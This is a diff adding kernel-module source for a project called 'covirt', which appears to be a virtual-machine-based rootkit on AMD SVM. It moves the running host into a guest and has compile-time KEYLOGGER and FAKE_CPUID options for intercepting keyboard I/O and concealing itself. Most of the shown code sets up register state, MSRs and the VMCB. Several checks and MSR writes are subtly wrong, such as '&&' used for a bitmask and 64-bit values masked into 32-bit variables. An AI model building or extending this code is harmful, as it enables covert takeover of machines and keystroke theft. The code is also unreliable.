+	__asm__ __volatile__("mov %%cr4, %0" : "=r"(cr4));
+	return cr4;
+}
+
+uint16_t get_es(void){
+ 	uint16_t es;
+	__asm__ __volatile__("mov %%es, %0" : "=m"(es));
+	return es;
+}
+
+uint16_t get_ds(void){
+ 	uint16_t ds;
+	__asm__ __volatile__("mov %%ds, %0" : "=m"(ds));
+	return ds;
+}
+
+uint16_t get_ss(void){
+ 	uint16_t ss;
+	__asm__ __volatile__("mov %%ss, %0" : "=m"(ss));
+	return ss;
+}
+
+uint16_t get_cs(void){
+ 	uint16_t cs;
+	__asm__ __volatile__("mov %%cs, %0" : "=m"(cs));
+	return cs;
+}
+
+uint16_t get_fs(void){
+ 	uint16_t fs;
+	__asm__ __volatile__("mov %%fs, %0" : "=m"(fs));
+	DEBUG_PRINT("FS: %x\n", fs);
+	return fs;
+}
+
+uint16_t get_gs(void){
+ 	uint16_t gs;
+	__asm__ __volatile__("mov %%gs, %0" : "=m"(gs));
+	return gs;
+}
+
+uint64_t get_dr6(void) {
+	uint64_t dr6;
+	__asm__ __volatile__("mov %%dr6, %0": "=a"(dr6));
+	return dr6;
+}
+uint64_t get_dr7(void) {
+	uint64_t dr7;
+	__asm__ __volatile__("mov %%dr7, %0": "=a"(dr7));
+	return dr7;
+}
+
+uint8_t get_vtpr(void){
+	uint64_t cr8;
+	uint8_t vtpr;  // Yes, i know the TPR is only 4 bits, but VMCB struct has 8 bits reserved for VMCB.
+	__asm__ __volatile__("mov %%cr8, %0": "=a"(cr8));
+	vtpr = cr8 & 0x0F;  // Happy? [3:0] = TPR, [7:4] = SBZ
+	return vtpr;
+}
+
+
+desc_ptr get_idtr(void)
+{
+	desc_ptr idtr;
+	__asm__ __volatile__("sidt %0" : "=m"(idtr));
+	return idtr;
+}
+
+desc_ptr get_gdtr(void)
+{
+	desc_ptr gdtr;
+	__asm__ __volatile__("sgdt %0" : "=m"(gdtr));
+	return gdtr;
+}
+
+uint16_t get_ldtr(void)
+{
+	uint16_t ldtr;
+	__asm__ __volatile__("sldt %0" : "=m"(ldtr));
+	return ldtr;
+}
+
+uint16_t get_tr(void){
+ 	uint16_t tr;
+	__asm__ __volatile__("str %0" : "=m"(tr));
+	return tr;
+}
+
+// uint8_t get_virq(void){
+// 	return 0;  // For now
+// }
+
+
+// Segment Descriptor Operations (NOT REGISTERS)
+
+// This could be done a little bit better because we already grab the gdtr and ldtr for the VMCB.
+// Whatever, doesn't matter. 
+uint64_t get_descriptor(seg_sel_t seg_sel){
+	// We'll just return 
+	desc_ptr gdtr = get_gdtr();
+	uint16_t selector_index = seg_sel.val & 0xfff8;  // This will be the offset into the descriptor table.
+	long * descriptor_ptr;  // Keep getting a dumb error regarding the uint64_t pointer, so i'm using a long (8 bytes)
+	if (seg_sel.TI == 0){
+		// Table Index == 0 => Global descriptor table
+		descriptor_ptr = (long *) (gdtr.base + selector_index);
+		// DEBUG_PRINT("GDTR BASE: %llx\n", gdtr.base);
+		// DEBUG_PRINT("Selector Index: %d\n", selector_index);
+		// DEBUG_PRINT("Descriptor: %llx\n", *descriptor_ptr);
+		return (uint64_t) *descriptor_ptr;
+	} 
+	// else {
+	// 	// Table Index == 1 => Local Descriptor Table
+	// 	sys_desc_t ldtr = get_ldtr(gdtr);
+	// 	descriptor_ptr = (long *) (ldtr.base + selector_index);
+	// 	return (uint64_t) *descriptor_ptr;
+	// }
+	DEBUG_PRINT("\n\nLOOKING FOR SOMETHING IN LDT\n\n");
+	return 0;
+}
+
+
+```
+
+`covirt/src/svm_utils.c`:
+
+```c
+#include <linux/kernel.h>
+#include <linux/slab.h>
+#include <asm/io.h>
+
+#include "reg_utils.h"
+#include "svm_utils.h"
+
+#ifdef DEBUG_ENABLED
+# define DEBUG_PRINT(...) printk(__VA_ARGS__)
+#else
+# define DEBUG_PRINT(...) do {} while (0)
+#endif
+
+extern phys_addr_t __global_VM_HSAVE_PA;
+/*
+    Check if this machine is capable of SVM. If not, we can't proceed.
+*/
+int svm_check(void) {
+	/* (AMD64 Docs Volume 2):
+	if (CPUID Fn8000_0001_ECX[SVM] == 0)
+		return SVM_NOT_AVAIL;
+	if (VM_CR.SVMDIS == 0)
+		return SVM_ALLOWED;
+	if (CPUID Fn8000_000A_EDX[SVML]==0)
+		return SVM_DISABLED_AT_BIOS_NOT_UNLOCKABLE
+		// the user must change a platform firmware setting to enable SVM
+	else return SVM_DISABLED_WITH_KEY;
+		// SVMLock may be unlockable; consult platform firmware or TPM to obtain the key.
+	*/
+
+	///
+	// CPUID to check whether SVM is enabled.
+	unsigned int op = 0x80000001;  // Specified function number for CPUID instruction
+	unsigned int eax = 0;
+	unsigned int ebx = 0;
+	unsigned int ecx = 0;
+	unsigned int edx = 0;
+
+	uint64_t vmcr_msr;
+	
+	cpuid(op, &eax, &ebx, &ecx, &edx);
+
+	if (ecx & SVM_FF) {		// Feature flag bit pos for SVM: ECX[2] (0100b)
+		DEBUG_PRINT("STATUS CHECK: SVM Available.\n");
+	} else {
+		DEBUG_PRINT("STATUS CHECK: SVM NOT Available.\n");
+		return -1;
+	}
+	
+	///
+	// Reading VM_CR to check for whether SVM is DISabled
+	// IF SVM.DIS == 1, EFER.SVME must be 0, thus we aren't able to do VMRUN.
+
+	DEBUG_PRINT("RDMSR on VM_CR...\n");
+
+	ecx = VM_CR;
+	vmcr_msr = read_msr(ecx);
+
+	DEBUG_PRINT("VMCR MSR: %016llx\n", vmcr_msr);
+	
+	if (!(vmcr_msr & VMCR_SVMDIS)){
+		DEBUG_PRINT("VMCR.SVMDIS: SVM Allowed (EFER.SVME Writeable)\n");
+	} else {
+		DEBUG_PRINT("VMCR.SVMDIS: SVM NOT Allowed (EFER.SVME MBZ)\n");
+	}
+
+	if (!(vmcr_msr & VMCR_Lock)){
+		DEBUG_PRINT("VMCR.Lock = 0 (VMCR bits 3 + 4 unlocked)\n");
+	} else {
+		DEBUG_PRINT("VMCR.SVMDIS = 1 (VMCR bits 3 + 4 locked)\n");
+	}
+
+	op = 0x8000000A;
+	eax = 0;
+	ecx = 0;
+	ebx = 0;
+	edx = 0;
+	cpuid(op, &eax, &ebx, &ecx, &edx);
+
+	if (edx & SVML_FF) {
+		DEBUG_PRINT("SVM disabled with key, may be unlockable.\n");
+	} else {
+		DEBUG_PRINT("SVM Disabled at BIOS, Not Unlockable\n");
+		//return -1;
+	}
+
+	if (edx & (0x1 << 3)){
+		DEBUG_PRINT("NRIPS ENABLED.\n");
+	} else {
+		DEBUG_PRINT("NRIPS DISABLED.\n");
+	}
+
+	return 0;
+}
+
+/*
+    All this does it flip the EFER.SVME bit to 1 to enable SVM.
+*/
+int enable_svm(void){
+    uint64_t cur_efer;
+	uint64_t new_efer;
+	uint32_t hi;
+	uint32_t lo;
+
+    // Set EFER.SVME to 1 
+	cur_efer = read_msr(EFER_MSR);
+	DEBUG_PRINT("Current EFER = %016llx\n", cur_efer);
+	new_efer = cur_efer | _SVME;
+	hi = new_efer & 0xFFFFFFFF00000000;
+	lo = new_efer & 0x00000000FFFFFFFF;
+	write_msr(EFER_MSR, hi, lo);
+	DEBUG_PRINT("New EFER = %016llx\n", new_efer);
+	
+	cur_efer = read_msr(EFER_MSR);
+	DEBUG_PRINT("Current EFER = %016llx\n", cur_efer);
+	if (cur_efer & _SVME){
+		DEBUG_PRINT("EFER.SVME modification SUCCESS!\n");
+        return 0;
+	} else {
+		DEBUG_PRINT("EFER.SVME modification FAILED\n");
+		return -1;
+	}
+}
+
+/*
+	VMRUN will save the Host state at the physical address in VM_HSAVE_PA MSR.
+	This function just allocates that memory and puts it into that MSR.
+
+	Not the best place to have this function, but since it's state-saving related
+	we'll keep it here for now.
+*/
+void init_vm_hsave_pa(void){
+	void * vm_hsave_va;
+	phys_addr_t vm_hsave_pa;
+	uint32_t hi;
+	uint32_t lo;
+
+	vm_hsave_pa = read_msr(VM_HSAVE_PA_MSR);
+	DEBUG_PRINT("BEFORE CHANGE: VM_HSAVE_PA MSR = %lldx\n", vm_hsave_pa);
+	// Allocate VM_HSAVE_PA MSR (C001_0117)
+	vm_hsave_va = kzalloc(0x1000, GFP_KERNEL);
+	vm_hsave_pa = virt_to_phys(vm_hsave_va);
+	hi = vm_hsave_pa & UPPER_4;
+	lo = vm_hsave_pa & LOWER_4;
+	write_msr(VM_HSAVE_PA_MSR, hi, lo);
+
+	vm_hsave_pa = read_msr(VM_HSAVE_PA_MSR);
+
+	__global_VM_HSAVE_PA = vm_hsave_pa;
+	DEBUG_PRINT("AFTER CHANGE: VM_HSAVE_PA MSR = %lldx\n", vm_hsave_pa);
+}
+```
+
+`covirt/src/unit_tester.c`:
+
+```c
+#include <linux/kernel.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/io.h>
+
+static inline void native_cpuid(u_int32_t *eax, u_int32_t *ebx,
+                                u_int32_t *ecx, u_int32_t *edx)
+{
+        /* ecx is often an input as well as an output. */
+        asm volatile("cpuid"
+            : "=a" (*eax),
+              "=b" (*ebx),
+              "=c" (*ecx),
+              "=d" (*edx)
+            : "0" (*eax), "2" (*ecx));
+}
+
+// Test the CPUID Fn0000_0000
+static int test_cpuid_vendor(void){
+    u_int32_t eax; 
+    u_int32_t ebx; 
+    u_int32_t ecx; 
+    u_int32_t edx; 
+
+    int i;
+
+    printf("CPUID Test (Print Vendor Name | Fn0000_0000) -----\n");
+    eax = 0x00000000;
+    native_cpuid(&eax, &ebx, &ecx, &edx);
+
+    for (i = 0; i < 4; i++){
+        printf("%c", ((ebx >> (i * 8)) & 0xFF));
+    }
+    for (i = 0; i < 4; i++){
+        printf("%c", ((edx >> (i * 8)) & 0xFF));
+    }
+    for (i = 0; i < 4; i++){
+        printf("%c", ((ecx >> (i * 8)) & 0xFF));
+    }
+    printf("\n\n");
+}
+
+static int test_kbd_read(void){
+    u_int8_t val;
+    ioperm(0x60, 8, 10);
+    val = inb(0x60);
+    printf("val: %x\n", val);
+    val = inb(0x60);
+    printf("val: %x\n", val);
+    val = inb(0x60);
+    printf("val: %x\n", val);
+    val = inb(0x60);
+    printf("val: %x\n", val);
+    return val;
+}
+
+int main(void){
+    printf("Beginning Unit Tests...\n\n");
+
+    test_cpuid_vendor();
+    //test_kbd_read();
+}
+
+
+
+
+
+
+```
+
+`covirt/src/vmcb.c`:
+
+```c
+#include <linux/kernel.h>
+#include <linux/slab.h>
+#include <asm/io.h>
+#include <linux/delay.h>
+#include <linux/string.h>
+
+#include "reg_utils.h"
+#include "vmcb.h"
+#include "exit_handle.h"
+#include "io.h"
+
+#ifdef DEBUG_ENABLED
+# define DEBUG_PRINT(...) printk(__VA_ARGS__)
+#else
+# define DEBUG_PRINT(...) do {} while (0)
+#endif
+
+extern void * __global_Host_Reg_Store; 
+extern void * __global_Guest_Reg_Store;
+extern void * __global_VMCB_VA;
+extern phys_addr_t __global_VMCB_PA;
+
+#define NOT_SYSTEM_DESCRIPTOR 0
+#define SYSTEM_DESCRIPTOR 1
+// extern phys_addr_t __global_VM_HSAVE_PA;
+
+// #include "vmcb.h"
+
+/*
+	VMRUN will pull the info from the VMCB to initialize the guest with.
+	We are simply putting our desired values in here.
+	Note: This is slightly different from a regular VMM, as this state isn't
+	going to be the default "just booted" state. This will essentially be
+	the state of our currently running host.
+*/
+static void store_guest_cpu_info(vmcb_t * vmcb, uint64_t rip, uint64_t rsp, uint64_t rax, uint64_t rflags){
+	// rip, rsp, rflags, rax are going to be provided as the VMCB will load them
+	// rflags and the other general purpose registers will be saved and restored separately
+	
+	desc_ptr idtr;
+	desc_ptr gdtr;
+	
+
+	// Code Segment
+	seg_sel_t cs_sel;
+
+	// Data Segment
+	seg_sel_t ds_sel;
+	seg_sel_t es_sel;
+	seg_sel_t fs_sel;
+	seg_sel_t gs_sel;
+	seg_sel_t ss_sel;
+
+	// System Registers
+	seg_sel_t ldtr_sel_lo;
+	seg_sel_t ldtr_sel_hi;
+	seg_sel_t tr_sel_lo;
+	seg_sel_t tr_sel_hi;
+
+	cs_sel.val = get_cs();
+	ds_sel.val = get_ds();
+	es_sel.val = get_es();
+	fs_sel.val = get_fs();
+	gs_sel.val = get_gs();
+	ss_sel.val = get_ss();
+
+	ldtr_sel_lo.val = get_ldtr();
+	ldtr_sel_hi.val = ldtr_sel_lo.val + 8;
+	tr_sel_lo.val = get_tr();
+	tr_sel_hi.val = tr_sel_lo.val + 8;
+
+	// Store CS, RIP [Done]
+	vmcb->state_save_area.cs = format_segment(get_descriptor(cs_sel), cs_sel.val);
+	vmcb->state_save_area.rip = rip;  // RIP
+
+	// Store RFLAGS, RAX [Done]
+	vmcb->state_save_area.rflags = rflags;  // RFLAGS
+	vmcb->state_save_area.rax = rax;	// RAX
+
+	// Store SS, RSP
+	vmcb->state_save_area.ss = format_segment(get_descriptor(ss_sel), ss_sel.val);
+	vmcb->state_save_area.rsp = rsp;	// RSP
+
+	// Store CR0, CR2, CR3, CR4, EFER [Done]
+	vmcb->state_save_area.cr0 = get_cr0();
+	vmcb->state_save_area.cr2 = get_cr2();
+	vmcb->state_save_area.cr3 = get_cr3();
+	vmcb->state_save_area.cr4 = get_cr4();
+	vmcb->state_save_area.efer = read_msr(EFER_MSR);
+	 
+	// Store INTERRUPT_SHADOW
+	
+	vmcb->control_area.gisw.interrupt_shadow = 0;  // If I don't know what an interrupt shadow is.. it must not be important O_O
+
+	// Store IDTR, GDTR [Done]
+	idtr = get_idtr();
+	vmcb->state_save_area.idtr.base = idtr.base;
+	DEBUG_PRINT("\nIDTR BASE: %llx\n\n", idtr.base);
+	vmcb->state_save_area.idtr.limit = idtr.limit;
+
+	gdtr = get_gdtr();
+	vmcb->state_save_area.gdtr.base = gdtr.base;
+	DEBUG_PRINT("\nGDTR BASE: %llx\n\n", gdtr.base);
+	vmcb->state_save_area.gdtr.limit = gdtr.limit;
+
+	// Store ES and DS
+
+	vmcb->state_save_area.es = format_segment(get_descriptor(es_sel), es_sel.val);
+	vmcb->state_save_area.ds = format_segment(get_descriptor(ds_sel), ds_sel.val);
+	
+	// Store FS and GS (This is a special case)
+
+	// vmcb->state_save_area.fs = format_segment(get_descriptor(fs_sel), fs_sel.val);
+	// //vmcb->state_save_area.fs.base = read_msr(0xC0000100);  // Get the actual base
+	// vmcb->state_save_area.gs = format_segment(get_descriptor(gs_sel), gs_sel.val);
+	// //vmcb->state_save_area.gs.base = read_msr(0xC0000101);
+
+	// Store DR6 and DR7 [Done]
+	vmcb->state_save_area.dr6 = get_dr6();
+	vmcb->state_save_area.dr7 = get_dr7();
+
+	// Store V_TPR (task priority register (cr8)) [Done]
+
+	vmcb->control_area.guest_int_ctrl.V_TPR = get_vtpr();
+
+	// Store V_IRQ (Is the virual guest pending IRQ) [Done]
+
+	vmcb->control_area.guest_int_ctrl.V_IRQ = 0;  // For now
+
+	// Store CPL [Done]
+
+	vmcb->state_save_area.cpl = 0;  // Have it run in kernel mode as usual.
+
+	// Setup the guest ASID (can't be 0)
+	vmcb->control_area.guest_asid = 1;
+
+	// Set VMRUN intercept bit to 1
+	vmcb->control_area.svm_instr_intercepts.VMRUN = 1;
+	//DEBUG_PRINT("VMCB SVM INSTR INTERCEPTS: %lx\n", vmcb->control_area.svm_instr_intercepts.val);
+
+	vmcb->control_area.N_CR3 = get_cr3();
+	// Stuff for VMLOAD + VMSAVE
+	// vmcb->state_save_area.star = read_msr(STAR_MSR);
+	// vmcb->state_save_area.lstar	= read_msr(LSTAR_MSR);
+	// vmcb->state_save_area.cstar = rsead_msr(CSTAR_MSR);
+	// vmcb->state_save_area.sfmask = read_msr(SFMASK_MSR);
+
+	// vmcb->state_save_area.kernel_gs_base = read_msr(KernelGSBase_MSR);
+
+	// vmcb->state_save_area.sysenter_cs = read_msr(SYSENTER_CS_MSR);
+	// vmcb->state_save_area.sysenter_esp = read_msr(SYSENTER_ESP_MSR);
+	// vmcb->state_save_area.sysenter_eip = read_msr(SYSENTER_EIP_MSR);
+
+	// System Descriptor Stuff
+
+	
+	// vmcb->state_save_area.ldtr = format_segment(get_descriptor(ldtr_sel_lo), ldtr_sel_lo.val);
+	// vmcb->state_save_area.ldtr.base += (get_descriptor(ldtr_sel_hi) & 0xffffffff) << 32;
+	// vmcb->state_save_area.ldtr.attrib = ldtr.attributes;
+	// vmcb->state_save_area.ldtr.base = ldtr.base;
+	// vmcb->state_save_area.ldtr.limit = ldtr.limit;
+	// vmcb->state_save_area.ldtr.selector = ldtr.selector;
+	
+	// vmcb->state_save_area.tr = format_segment(get_descriptor(tr_sel_lo), tr_sel_lo.val);
+	// vmcb->state_save_area.tr.base += (get_descriptor(tr_sel_hi) & 0xffffffff) << 32;
+	// vmcb->state_save_area.tr.attrib = tr.attributes;
+	// vmcb->state_save_area.tr.base = tr.base;
+	// vmcb->state_save_area.tr.limit = tr.limit;
+	// vmcb->state_save_area.tr.selector = tr.selector;
+}
+
+/*
+	This is the big boy. Gets called by our VM_Setup_and_Run() assembly routine to set the VMCB up for it's initial run.
+*/
+phys_addr_t vmcb_init(uint64_t rip, uint64_t rsp, uint64_t rax, uint64_t rflags) {
+
+    vmcb_t * vmcb_ptr;
+	phys_addr_t phys_vmcb_ptr;
+
+	// Allocate VMCB Region
+	vmcb_ptr = (vmcb_t *)kzalloc(VMCB_SIZE, GFP_KERNEL);
+	if (!vmcb_ptr){
+		DEBUG_PRINT("Failed to allocate VMCB\n");
+		return -1;
+	}
+	
+	DEBUG_PRINT("VMCB allocated at %px\n", vmcb_ptr);
+    phys_vmcb_ptr = virt_to_phys((void *) vmcb_ptr);
+
+	DEBUG_PRINT("Physical VMCB %llx\n", phys_vmcb_ptr);
+	__global_VMCB_VA = (void *) vmcb_ptr; 
+	__global_VMCB_PA = phys_vmcb_ptr;
+
+	// Populate the VMCB
+	store_guest_cpu_info(vmcb_ptr, rip, rsp, rax, rflags);
+
+	// Set things to interrupt/functionality of our VMBR
+	set_exit_reasons();
+
+	// need to setup the IOIO_PROT address and stuff
+	// allocate 12 Kbyte for the port mapping
+	phys_addr_t iopm_pa = virt_to_phys(setup_iopm());
+	vmcb_ptr->control_area.IOPM_BASE_PA = iopm_pa;
+
+	debug_vmcb(__global_VMCB_VA);
+	consistency_checks();
+
+	return phys_vmcb_ptr;
+}
+
+void set_exit_reasons(void){
+	vmcb_t * vmcb = (vmcb_t *) __global_VMCB_VA;
+
+	#ifdef FAKE_CPUID
+		vmcb->control_area.instr_intercepts.CPUID = 1;	// Intercept CPUID Instruction
+	#endif
+
+	// Physical interrupt stuff
+	//vmcb->control_area.instr_intercepts.INTR = 1;
+	//vmcb->control_area.guest_int_ctrl.V_INTR_MASK = 1;	// Host IF for P-ints. Guest IF only for V-ints.
+
+	#ifdef KEYLOGGER
+		vmcb->control_area.instr_intercepts.IOIO_PROT = 1;
+	#endif
+}
+
+/*
+	Utility: Check the VMCB for faulty state
+
+	Additional Notes: 
+	VMRUN will perform consistency checks. If checks fail => Instant VMEXIT.
+	This is just useful for doing the checks on our own first, allowing us to see
+	the cause of potential VMEXITS.
+*/
+void consistency_checks(void){
+	// YES I KNOW THIS IS UGLY AF
+	// I DONT CARE I JUST WANT IT TO WORK
+
+	vmcb_t * vmcb = (vmcb_t *) __global_VMCB_VA;
+	
+	uint64_t cr3 = vmcb->state_save_area.cr3;
+
+	uint64_t cr4 = vmcb->state_save_area.cr4;
+	uint64_t cr4_pae_bit = 0x1UL << 5;
+	uint64_t cr4_cet_bit = 0x1UL << 23;
+
+	uint64_t dr6 = vmcb->state_save_area.dr6;
+	uint64_t dr7 = vmcb->state_save_area.dr7;
+	uint64_t cr3_mbz = (0xfffUL << 52) + (0x7fUL << 5) + 0x7;
+	uint64_t cr4_mbz = (0xffffffffUL << 32) + (0xFFUL << 24) + (0x1UL << 19) + (0xFUL << 12);
+
+	cr0_reg_t cr0;
+	cr0.val = vmcb->state_save_area.cr0;
+
+	efer_reg_t efer_reg;
+	efer_reg.val = vmcb->state_save_area.efer;
+
+	//uint64_t cs = (vmcb->state_save_area.cs);cs
+	//uint64_t cs_long_bit = 0x1UL << (21 + 32);
+	//uint64_t cs_d_bit = 0x1UL << (22 + 32);
+
+	// Just gonna print out the saved RIP
+	DEBUG_PRINT("Saved RIP: %llx\n", vmcb->state_save_area.rip);
+
+	// EFER.SVME is zero
+	if (!(read_msr(EFER_MSR) & _SVME)){
+		DEBUG_PRINT("ERROR: EFER.SVME bit is zero\n");
+	}
+
+	// CR0.CD is zero and CR0.NW is set
+	// CD (Cache Disable) @ [30] 
+	// NW (Not Writethrough) @ [29]
+
+	if ((cr0.CD == 0) && (cr0.NW)){
+		DEBUG_PRINT("ERROR: CR0.CD and CR0.NW issue\n");
+	}
+
+	// CR0[64:32] are not zero
+	if (cr0.rsvd3 != 0) {
+		DEBUG_PRINT("ERROR: CR0[63:32] not zero\n");
+	}
+
+	// Any MBZ bit of CR3 is set (gonna check long mode here)
+	if ((cr3 & cr3_mbz) != 0){
+		DEBUG_PRINT("ERROR: CR3 MBZ bits set\n");
+	}
+
+	// Any MBZ of CR4 set
+	if ((cr4 & cr4_mbz) != 0){
+		DEBUG_PRINT("ERROR: CR4 MBZ bits set\n");
+	}
+
+	// DR6[63:32] are not zero
+	if (dr6 && (0xffffffffUL << 32)) {
+		DEBUG_PRINT("ERROR: DR6[63:32] are not zero\n");
+	}
+
+	// DR7[63:32] are not zero
+	if (dr7 && (0xffffffffUL << 32)) {
+		DEBUG_PRINT("ERROR: DR7[63:32] are not zero\n");
+	}
+
+	// Any EFER MBZ Bit of EFER set
+	if (efer_reg.rsvd0 || efer_reg.rsvd1 || efer_reg.rsvd2 || efer_reg.rsvd3 || efer_reg.rsvd4 ) {
+		DEBUG_PRINT("ERROR: EFER MBZ bits set\n");
+	}
+
+	// THis check is only for if the processor doesn't support long mode.
+	//if ((efer_reg.LMA || efer_reg.LME))
+
+	// EFER.LME and CR0.PG are both set and CR4.PAE is zero
+	if ((efer_reg.LME && cr0.PG && !(cr4 & cr4_pae_bit))) {
+		DEBUG_PRINT("ERROR: LME + PG = 1 and CR4.PAE = 0\n");
+	}
+
+	// EFER.LME and CR0.PG are both non-zero and CR0.PE is zero
+	if ((efer_reg.LME && cr0.PG) && !(cr0.PE)) {
+		DEBUG_PRINT("ERROR: LME + PG = 1 and CR0.PE = 0\n");
+	}
+
+	/*
+	// EFER.LME, CR0.PG, CR4.PAE, CS.L, and CS.D are all non-zero
+	if (efer_reg.LME && cr0.PG && (cr4 & cr4_pae_bit) && (cs & cs_long_bit) && (cs & cs_d_bit)) {
+		DEBUG_PRINT("ERROR: EFER.LME, CR0.PG, CR4.PAE, CS.L, and CS.D are all non-zero\n");
+	}
+	*/
+
+	// The VMRUN intercept bit is clear.
+	if (vmcb->control_area.svm_instr_intercepts.VMRUN == 0) {
+		DEBUG_PRINT("ERROR: The VMRUN intercept bit is clear.\n");
+		DEBUG_PRINT("VMCB VMRUN INTERCEPT BIT: %d\n", vmcb->control_area.svm_instr_intercepts.VMRUN);
+	}
+
+	// I've got absolutely no clue what these two are. Will do them tomorrow :D
+	// TODO: The MSR or IOIO intercept tables extend to a physical address that is greater than or equal to the maximum supported physical address
+	// TODO: Illegal event injection (section 15.20)
+
+	// ASID is equal to zero.
+	if (vmcb->control_area.guest_asid == 0){
+		DEBUG_PRINT("ERROR: ASID is equal to zero.\n");
+	}
+
+	// TODO: WIll need to make this cleaner ofc...
+	// Any reserved bit is set in S_CET
+	if (vmcb->state_save_area.s_cet & 0xfffffffffffffffc) {
+		DEBUG_PRINT("Reserved bit of S_CET set\n");
+	}
+
+	// CR4.CET=1 when CR0.WP=0
+	if ((cr4 & cr4_cet_bit) && !(cr0.WP)){
+		DEBUG_PRINT("ERROR: CR4.CET=1 when CR0.WP=0\n");
+	}
+
+	// TODO: CR4.CET=1 and U_CET.SS=1 when EFLAGS.VM=1
+
+	/* TODO:
+	• any reserved bit set in U_CET (SEV_ES only):
+		- VMRUN results in VMEXIT(INVALID)
+		- VMEXIT forces reserved bits to 0
+	*/
+
+	/* NOTES:
+	VMRUN can load a guest value of CR0 with PE = 0 but PG = 1, a combination that is otherwise illegal
+	(see Section 15.19).
+	In addition to consistency checks, VMRUN and #VMEXIT canonicalize (i.e., sign-extend to bit 63):
+		• All base addresses in the segment registers that have been loaded.
+		• SSP
+		• ISST_ADDR
+		• PL0_SSP, PL1_SSP, PL2_SSP, PL3_SSP
+	*/
+}
+
+// YES, THIS IS REDUNDANT. I COULD'VE JUST MADE SURE MY STRUCTS WERE WELL MADE
+// BUT I DON'T TRUST MYSELF. Now... do i trust myself to write accurate test cases? No.
+// SO that doesn't really fix the problem then does it. No.
+// awesome.
+void debug_vmcb(vmcb_t * vmcb){
+	int ssa_offset = 0x400;
+
+	DEBUG_PRINT("----- BEGIN VMCB DEBUG OUTPUT -----\n");
+	DEBUG_PRINT("VMCB Virt Addr: %px\n", vmcb);
+	DEBUG_PRINT("VMCB Phys Addr: %llx\n", virt_to_phys(vmcb));
+	// WARNING: I don't actually look inside of the structs of each of these just yet.
+	// This means that the offsets within certain structs could still be wrong.
+	// In other words, these checks are not exhaustive.
+	check_entry_offset(0x000, (uint64_t) &vmcb->control_area.cr_reads, "CR READS");
+	check_entry_offset(0x004, (uint64_t) &vmcb->control_area.dr_reads, "DR READS");
+	check_entry_offset(0x008, (uint64_t) &vmcb->control_area.exception_vectors, "Exception Vectors");
+	check_entry_offset(0x00C, (uint64_t) &vmcb->control_area.instr_intercepts, "Instr Intercepts");
+	check_entry_offset(0x010, (uint64_t) &vmcb->control_area.svm_instr_intercepts, "SVM Instr Intercepts");
+	check_entry_offset(0x014, (uint64_t) &vmcb->control_area.mm_instr_intercepts, "MM Instr Intercepts");
+	check_entry_offset(0x018, (uint64_t) &vmcb->control_area.rsvd0, "RSVD0");
+	check_entry_offset(0x03C, (uint64_t) &vmcb->control_area.pause_filter_threshold, "Pause filter thresh");
+	check_entry_offset(0x03E, (uint64_t) &vmcb->control_area.pause_filter_count, "Pause filter count");
+	check_entry_offset(0x040, (uint64_t) &vmcb->control_area.IOPM_BASE_PA, "IOPM_BASE_PA");
+	check_entry_offset(0x048, (uint64_t) &vmcb->control_area.MSRPM_BASE_PA, "MSRPM_BASE_PA");
+	check_entry_offset(0x050, (uint64_t) &vmcb->control_area.TSC_OFFSET, "TSC_OFFSET");
+
+	check_entry_offset(0x058, (uint64_t) &vmcb->control_area.guest_asid, "guest_asid");
+	check_entry_offset(0x05C, (uint64_t) &vmcb->control_area.TLB_CONTROL, "TLB_CONTROL");
+	
+	check_entry_offset(0x060, (uint64_t) &vmcb->control_area.guest_int_ctrl, "guest_int_ctrl");
+
+	// Made a random struct here for reasons [gisw]
+	check_entry_offset(0x068, (uint64_t) &vmcb->control_area.gisw, "gisw");
+
+	check_entry_offset(0x070, (uint64_t) &vmcb->control_area.EXIT_CODE, "EXIT_CODE");
+	check_entry_offset(0x078, (uint64_t) &vmcb->control_area.EXIT_INFO1, "EXIT_INFO1");
+	check_entry_offset(0x080, (uint64_t) &vmcb->control_area.EXIT_INFO2, "EXIT_INFO2");
+	check_entry_offset(0x088, (uint64_t) &vmcb->control_area.EXIT_INT_INFO, "EXITINTINFO");
+
+	// Made a random struct here for reasons [misc_enable]
+	check_entry_offset(0x090, (uint64_t) &vmcb->control_area.misc_enable, "misc_enable");
+
+	check_entry_offset(0x098, (uint64_t) &vmcb->control_area.avic_apic_bar, "avic_apic_bar");
+	check_entry_offset(0x0A0, (uint64_t) &vmcb->control_area.GHCB_PA, "GHCB_PA");
+
+	check_entry_offset(0x0A8, (uint64_t) &vmcb->control_area.EVENTINJ, "EVENTINJ");
+	check_entry_offset(0x0B0, (uint64_t) &vmcb->control_area.N_CR3, "N_CR3");
+
+	// Made a random struct here for reasons [more_ves]
+	check_entry_offset(0x0B8, (uint64_t) &vmcb->control_area.more_ves, "more_ves");
+
+	check_entry_offset(0x0C0, (uint64_t) &vmcb->control_area.clean_bits, "clean_bits");
+
+	check_entry_offset(0x0C8, (uint64_t) &vmcb->control_area.nRIP, "nRIP");
+
+	// Made a random struct here for reasons [instr_fetch_info]
+	check_entry_offset(0x0D0, (uint64_t) &vmcb->control_area.instr_fetch_info, "instr_fetch_info");
+
+	check_entry_offset(0x0E0, (uint64_t) &vmcb->control_area.apic_info, "apic_info");
+	
+	check_entry_offset(0x0F0, (uint64_t) &vmcb->control_area.avic_log_info, "avic_log_info");
+
+	check_entry_offset(0x0F8, (uint64_t) &vmcb->control_area.avic_phys_info, "avic_phys_info");
+
+	check_entry_offset(0x108, (uint64_t) &vmcb->control_area.vmsa_info, "vmsa_info");
+
+	DEBUG_PRINT("Control area kinda done checking... \n");
+
+	check_entry_offset(ssa_offset + 0x000, (uint64_t) &vmcb->state_save_area.es, "es");
+	check_entry_offset(ssa_offset + 0x010, (uint64_t) &vmcb->state_save_area.cs, "cs");
+	check_entry_offset(ssa_offset + 0x020, (uint64_t) &vmcb->state_save_area.ss, "ss");
+	check_entry_offset(ssa_offset + 0x030, (uint64_t) &vmcb->state_save_area.ds, "ds");
+	check_entry_offset(ssa_offset + 0x040, (uint64_t) &vmcb->state_save_area.fs, "fs");
+	check_entry_offset(ssa_offset + 0x050, (uint64_t) &vmcb->state_save_area.gs, "gs");
+	check_entry_offset(ssa_offset + 0x060, (uint64_t) &vmcb->state_save_area.gdtr, "gdtr");
+	check_entry_offset(ssa_offset + 0x070, (uint64_t) &vmcb->state_save_area.ldtr, "ldtr");
+	check_entry_offset(ssa_offset + 0x080, (uint64_t) &vmcb->state_save_area.idtr, "idtr");
+	check_entry_offset(ssa_offset + 0x090, (uint64_t) &vmcb->state_save_area.tr, "tr");
+
+	check_entry_offset(ssa_offset + 0x0CB, (uint64_t) &vmcb->state_save_area.cpl, "cpl");
